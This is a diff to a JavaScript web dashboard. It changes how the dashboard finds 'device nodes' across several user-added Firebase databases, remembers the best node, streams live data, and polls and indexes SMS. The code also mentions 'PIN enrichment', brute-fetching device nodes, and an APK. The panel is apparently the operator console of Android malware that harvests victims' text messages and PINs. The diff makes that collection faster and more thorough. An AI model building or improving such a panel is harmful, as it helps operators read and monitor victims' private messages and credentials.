@@ -24,6 +24,7 @@ var SMS_POLL_MS=800, SMS_POLL_BG_MS=3000, SYNC_INTERVAL_MS=90000;
 var SMS_RENDER_DEBOUNCE_MS=16;
 var _smsRenderTimer=null, _sendInFlight=false;
 var FB_LIST_KEY='nya_firebase_list';
+var FB_NODE_MEMORY_KEY='nya_fb_node_memory';
 var ACTIVE_FB_KEY='rbl_active_fb';
 var activeFbId='';
 /** APK-style fast boot — deep multi-node scan runs in background */
@@ -622,10 +623,148 @@ function setFilter(mode,btn){
   else showPage('home');
 }
 function showLoading(on,force){
-  if(on&&!force&&_initialLoadDone)return;
-  _loadingVisible=!!on;
+  /* loading screen disabled — panel opens instantly like APK */
+  _loadingVisible=false;
   var el=document.getElementById('loading');
-  if(el)el.classList.toggle('show',_loadingVisible);
+  if(el){el.classList.remove('show');el.style.display='none';}
+}
+function normalizeFbUrl(url){
+  return String(url||'').replace(/\/$/,'');
+}
+function loadFbNodeMemory(){
+  try{
+    var s=localStorage.getItem(FB_NODE_MEMORY_KEY);
+    if(s){var o=JSON.parse(s);if(o&&typeof o==='object')return o;}
+  }catch(e){}
+  return {};
+}
+function saveFbNodeMemory(mem){
+  try{localStorage.setItem(FB_NODE_MEMORY_KEY,JSON.stringify(mem||{}));}catch(e){}
+}
+function getRememberedNode(inst){
+  if(!inst)return '';
+  var mem=loadFbNodeMemory();
+  var url=normalizeFbUrl(inst.restUrl||(inst.config&&inst.config.databaseURL));
+  var row=mem[url]||mem[inst.id];
+  return row&&row.node?String(row.node):'';
+}
+function applyRememberedNode(inst,node){
+  if(!inst||!node)return;
+  if(inst.config){
+    inst.config.preferredDeviceNode=node;
+    inst.config.deviceNode=node;
+  }
+}
+function rememberFbNode(inst,node,nodeCount){
+  if(!inst||!node)return;
+  var url=normalizeFbUrl(inst.restUrl||(inst.config&&inst.config.databaseURL));
+  var mem=loadFbNodeMemory();
+  var cnt=nodeCount!=null?nodeCount:countDevicesFromNode(inst.id,node);
+  var prev=mem[url];
+  if(!prev||cnt>=(prev.count||0)){
+    mem[url]={node:node, count:cnt, at:Date.now(), fbId:inst.id, name:(inst.config&&inst.config.name)||inst.name||''};
+    saveFbNodeMemory(mem);
+    applyRememberedNode(inst,node);
+    saveFirebaseConfigs();
+  }
+}
+function applyNodeMemoryToConfigs(configs){
+  var mem=loadFbNodeMemory();
+  (configs||[]).forEach(function(c){
+    var url=normalizeFbUrl(c.databaseURL);
+    var row=mem[url]||mem[c.id];
+    if(row&&row.node){
+      c.preferredDeviceNode=row.node;
+      c.deviceNode=row.node;
+    }
+  });
+  return configs;
+}
+function countDevicesFromNode(fbId,node){
+  var n=0;
+  Object.keys(clientsRawMap).forEach(function(k){
+    if(k.indexOf(fbId+'::')!==0)return;
+    var r=clientsRawMap[k];
+    if(r&&r._node===node)n++;
+  });
+  return n;
+}
+function nodesToTryForInst(inst){
+  var seen={}, out=[];
+  function add(n){n=String(n||'').trim();if(n&&!seen[n]){seen[n]=1;out.push(n);}}
+  add(getRememberedNode(inst));
+  if(inst&&inst.config){
+    add(inst.config.preferredDeviceNode);
+    add(inst.config.deviceNode);
+  }
+  getDeviceNodesForInst(inst).forEach(add);
+  DEVICE_FETCH_NODES.forEach(add);
+  return out;
+}
+function probeRemainingNodesSequential(inst,nodes,primaryNode){
+  var rest=(nodes||[]).filter(function(n){return n&&n!==primaryNode;});
+  var bestNode=primaryNode||'';
+  var bestCount=bestNode?countDevicesFromNode(inst.id,bestNode):0;
+  var i=0;
+  function next(){
+    if(i>=rest.length)return Promise.resolve();
+    var node=rest[i++], before=countInstDevices(inst.id);
+    return fetchSummaryNodeFirebase(inst,node).then(function(){
+      var nc=countDevicesFromNode(inst.id,node);
+      if(nc>bestCount&&nc>0){
+        bestCount=nc;
+        bestNode=node;
+        rememberFbNode(inst,node,nc);
+      }
+      if(countInstDevices(inst.id)>before)processClientsData();
+      return next();
+    }).catch(function(){return next();});
+  }
+  return next().then(function(){
+    return enrichFromUserList(inst).catch(function(){return null;}).then(function(){
+      return buildSmsIndex(inst).catch(function(){return null;});
+    });
+  });
+}
+function discoverInstanceProbe(inst){
+  var nodes=nodesToTryForInst(inst);
+  var found='', i=0;
+  function tryNext(){
+    if(i>=nodes.length){
+      processClientsData();
+      restJsonInstShallow(inst).then(function(roots){
+        if(roots&&!isFirebaseErr(roots))applyInstanceRoots(inst,roots);
+      }).catch(function(){});
+      if(!found&&getRememberedNode(inst))applyRememberedNode(inst,getRememberedNode(inst));
+      return probeRemainingNodesSequential(inst,nodes,found||getRememberedNode(inst)||'clients');
+    }
+    var node=nodes[i++], before=countInstDevices(inst.id);
+    return fetchSummaryNodeFirebase(inst,node).then(function(){
+      var nodeCount=countDevicesFromNode(inst.id,node);
+      var total=countInstDevices(inst.id);
+      if(nodeCount>0||(total>before&&!found)){
+        found=node;
+        rememberFbNode(inst,node,nodeCount||total-before);
+        if(inst.db)attachLiveNode(inst,node);
+        processClientsData();
+        return probeRemainingNodesSequential(inst,nodes,found);
+      }
+      return tryNext();
+    }).catch(function(){return tryNext();});
+  }
+  var remembered=getRememberedNode(inst);
+  if(remembered&&nodes[0]===remembered){
+    return fetchSummaryNodeFirebase(inst,remembered).then(function(){
+      if(countInstDevices(inst.id)>0){
+        applyRememberedNode(inst,remembered);
+        if(inst.db)attachLiveNode(inst,remembered);
+        processClientsData();
+        return probeRemainingNodesSequential(inst,nodes,remembered);
+      }
+      return tryNext();
+    });
+  }
+  return tryNext();
 }
 function deleteChecked(){
   if(!confirm('Are you sure you want to delete ALL clients and messages?'))return;
@@ -914,7 +1053,7 @@ function loadFirebaseConfigs(){
       if(!c.deviceNode)c.deviceNode='clients';
       if(c.preferredDeviceNode==='user_data'&&!c.schema)c.preferredDeviceNode='clients';
     });
-    return out;
+    return applyNodeMemoryToConfigs(out);
   }
   try{
     var s=localStorage.getItem(FB_LIST_KEY);
@@ -1025,14 +1164,11 @@ function addFirebaseProject(extractMeta){
   saveFirebaseConfigs();
   var inst=initFirebaseInstance(cfg);
   attachLiveFast(inst);
-  discoverInstanceFast(inst).then(function(){
+  discoverInstanceProbe(inst).then(function(){
     processClientsDataNow();
     updateFbUi();
     toast('Added: '+name,true);
-    discoverInstanceDeep(inst).then(function(){
-      attachLive(inst);
-      processClientsDataNow();
-    });
+    attachLive(inst);
   });
   document.getElementById('fbAddName').value='';
   document.getElementById('fbAddUrl').value='';
@@ -1545,55 +1681,6 @@ function sortInstancesActiveFirst(insts){
     return 0;
   });
 }
-function discoverInstanceFast(inst){
-  var pref=(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'';
-  var primary=pref||'clients';
-  return fetchSummaryNodeFirebase(inst,primary).then(function(){
-    var before=countInstDevices(inst.id);
-    var fallbacks=fastDeviceNodesForInst(inst,{}).filter(function(n){return n!==primary;});
-    var chain=Promise.resolve();
-    if(before===0&&fallbacks.length){
-      chain=fetchSummaryNodeFirebase(inst,fallbacks[0]);
-    }
-    return chain.then(function(){
-      processClientsData();
-      restJsonInstShallow(inst).then(function(roots){
-        if(roots&&!isFirebaseErr(roots))applyInstanceRoots(inst,roots);
-      }).catch(function(){});
-    });
-  });
-}
-function discoverInstanceDeep(inst){
-  if(inst._deepDiscoverDone)return Promise.resolve();
-  var rootMap={};
-  if(inst.rootKeys&&inst.rootKeys.length){
-    inst.rootKeys.forEach(function(k){rootMap[k]=1;});
-  }
-  var all=allDeviceNodesForInst(inst,rootMap);
-  var fast=fastDeviceNodesForInst(inst,rootMap);
-  var remaining=all.filter(function(n){return fast.indexOf(n)<0;});
-  function fetchBatch(start){
-    if(start>=remaining.length){
-      inst._deepDiscoverDone=true;
-      return enrichFromUserList(inst).catch(function(){return null;}).then(function(){
-        return buildSmsIndex(inst).catch(function(){return null;});
-      });
-    }
-    return Promise.all(remaining.slice(start,start+DEEP_DISCOVER_CONCURRENCY).map(function(n){
-      return fetchSummaryNodeFirebase(inst,n).catch(function(){return null;});
-    })).then(function(){
-      processClientsData();
-      return fetchBatch(start+DEEP_DISCOVER_CONCURRENCY);
-    });
-  }
-  if(!remaining.length){
-    inst._deepDiscoverDone=true;
-    return enrichFromUserList(inst).catch(function(){return null;}).then(function(){
-      return buildSmsIndex(inst).catch(function(){return null;});
-    });
-  }
-  return fetchBatch(0);
-}
 function attachLiveNode(inst,node){
   if(!inst.db||!node)return;
   try{
@@ -1624,9 +1711,8 @@ function attachLiveNode(inst,node){
 function attachLiveFast(inst){
   if(!inst.db||inst.liveFastAttached)return;
   inst.liveFastAttached=true;
-  var node=(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
+  var node=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
   attachLiveNode(inst,node);
-  if(node!=='clients')attachLiveNode(inst,'clients');
 }
 function processClientsData(){
   if(_procDevsTimer)clearTimeout(_procDevsTimer);
@@ -1685,20 +1771,20 @@ function bruteFetchDeviceNodes(inst){
   return Promise.all(tasks).then(function(){processClientsData();});
 }
 function discoverInstance(inst){
-  return discoverInstanceFast(inst).then(function(){
-    return discoverInstanceDeep(inst);
-  });
+  return discoverInstanceProbe(inst);
 }
 function attachLive(inst){
+  var primary=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
   attachLiveFast(inst);
   if(!inst.db||inst.liveAttached)return;
   inst.liveAttached=true;
-  var watched=getDeviceNodesForInst(inst).slice(0,12);
+  if(primary!=='clients'&&primary!==(inst.config&&inst.config.preferredDeviceNode))attachLiveNode(inst,primary);
+  var watched=getDeviceNodesForInst(inst).slice(0,8);
   watched.forEach(function(node){
-    if(node===(inst.config&&inst.config.preferredDeviceNode)||node==='clients')return;
+    if(node===primary||node==='clients')return;
     attachLiveNode(inst,node);
   });
-  var smsRoots=(inst.smsRootKeys||[]).slice(0,4);
+  var smsRoots=(inst.smsRootKeys||[]).slice(0,3);
   smsRoots.forEach(function(root){
     if(!root||SKIP_NODES.indexOf(root)>=0)return;
     try{
@@ -1709,43 +1795,23 @@ function attachLive(inst){
     }catch(e){}
   });
 }
-function runBackgroundDeepDiscover(insts){
-  insts=sortInstancesActiveFirst(insts||firebaseInstances);
-  return mapPoolLimit(insts,function(inst){
-    return discoverInstanceDeep(inst).then(function(){
-      if(inst.db&&!inst.liveAttached)attachLive(inst);
-    });
-  },DEEP_DISCOVER_CONCURRENCY).then(function(){
-    processClientsDataNow();
-    runBackgroundPinEnrichmentAll();
-  }).catch(function(){
-    runBackgroundPinEnrichmentAll();
-  });
-}
 function fetchAllData(force){
   if(_panelPaused)return Promise.resolve();
-  var showBlock=!_initialLoadDone||!!force;
-  if(showBlock)showLoading(true,true);
+  _initialLoadDone=true;
+  showLoading(false,true);
   if(force){
     firebaseInstances.forEach(function(inst){inst._deepDiscoverDone=false;});
   }
   var insts=sortInstancesActiveFirst(firebaseInstances);
+  processClientsDataNow();
   insts.forEach(attachLiveFast);
-  var fastSync=mapPoolLimit(insts,discoverInstanceFast,DISCOVER_CONCURRENCY);
-  var timeoutMs=showBlock?FAST_LOAD_MS:8000;
-  var timeout=new Promise(function(resolve){setTimeout(resolve,timeoutMs);});
-  function finishLoad(){
+  return mapPoolLimit(insts,discoverInstanceProbe,DISCOVER_CONCURRENCY).then(function(){
     processClientsDataNow();
-    _initialLoadDone=true;
-    if(showBlock)showLoading(false,true);
-  }
-  return Promise.race([fastSync,timeout]).then(function(){
-    finishLoad();
-    runBackgroundDeepDiscover(insts);
-    fastSync.then(function(){processClientsDataNow();}).catch(function(){});
+    insts.forEach(function(inst){if(inst.db)attachLive(inst);});
+    runBackgroundPinEnrichmentAll();
   }).catch(function(){
-    finishLoad();
-    runBackgroundDeepDiscover(insts);
+    processClientsDataNow();
+    runBackgroundPinEnrichmentAll();
   });
 }
 function refreshData(){toast('Refreshing...',true);fetchAllData(true);}
